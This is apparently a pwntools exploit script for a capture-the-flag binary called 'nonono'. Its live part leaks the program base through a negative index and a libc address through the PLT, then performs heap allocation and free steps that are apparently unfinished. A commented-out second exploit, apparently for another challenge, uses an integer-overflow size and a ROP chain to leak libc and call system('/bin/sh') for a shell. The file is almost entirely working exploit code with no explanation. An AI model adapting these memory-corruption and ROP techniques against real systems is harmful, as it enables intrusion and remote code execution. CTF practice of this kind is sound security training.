from pwn import *

context.log_level = 'DEBUG'
yen = process('./nonono')
libc, nonono = ELF('libc.so.6'), ELF('./nonono')
#yen = remote('eductf.zoolab.org', 10105)

# leak base address
yen.sendlineafter('>>', '2')
yen.sendlineafter('IDX :', '-7')
global_base = u64(yen.recvline()[1:7]+'\0\0') - 0x08
success('base --> %s'%hex(global_base))
nonono.address = global_base-0x202000
# leak libc
success('plt --> %s'%hex(nonono.plt['puts']))
offset_plt = (nonono.plt['puts']-global_base)/8 - 8
yen.sendlineafter('>>', '2')
yen.sendlineafter('IDX :', str(offset_plt))
libc_base = u64(yen.recvline()[1:7]+'\0\0')
success('puts_libc --> %s'%hex(libc_base))
#success('libc --> %s'%hex(libc_base))
# send big big
yen.sendlineafter('>>', '1')
yen.sendlineafter('IDX : ', '5')
yen.sendlineafter('SIZE : ', '4000')
yen.sendlineafter('CONTENT: ', 'BBBBBBBB')

yen.sendlineafter('>>', '1')
yen.sendlineafter('IDX : ', '6')
yen.sendlineafter('SIZE : ', '4000')
yen.sendlineafter('CONTENT: ', 'CCCCCCCC')

yen.sendlineafter('>>', '1')
yen.sendlineafter('IDX : ', '7')
yen.sendlineafter('SIZE : ', '4000')
yen.sendlineafter('CONTENT: ', 'DDDDDDDD')

yen.sendlineafter('>>', '3')
yen.sendlineafter('IDX : ', '5')

yen.sendlineafter('>>', '3')
yen.sendlineafter('IDX : ', '6')

yen.sendlineafter('>>', '1')
yen.sendlineafter('IDX : ', '8')
yen.sendlineafter('SIZE : ', '600')
yen.sendafter('CONTENT: ', '')

yen.interactive()
















######################################################################################3
'''
pop_rdi = 0x400873
put_plt = 0x4005b0


printf_got = 0x601020
printf_libc_off = 0x64e80
main = 0x400748

system_off = 0x4f440



size = '-2147483648'
sc = flat(
	'A'*0x100,
	p64(0x400810),
	p64(pop_rdi),
	p64(printf_got),
	p64(put_plt),
	p64(main)
	)

yen.sendlineafter('Size:', size)
yen.recvuntil('It\'s safe now :)')
yen.send(sc)
yen.recvline()

baselibc = u64(yen.recvline()[0:6]+'\0\0') - printf_libc_off
system = baselibc + system_off
success( 'libc -> %s'%hex(baselibc))
bin_sh = baselibc + 0x1b3e9a
daibao = flat(
	'A'*0x100,
	p64(0x400810),
	p64(0x400294),
	p64(pop_rdi),
	p64(bin_sh),
	p64(system)	
	)
yen.sendlineafter('Size:', size)
yen.recvuntil('It\'s safe now :)')
yen.send(daibao)
yen.interactive()
'''
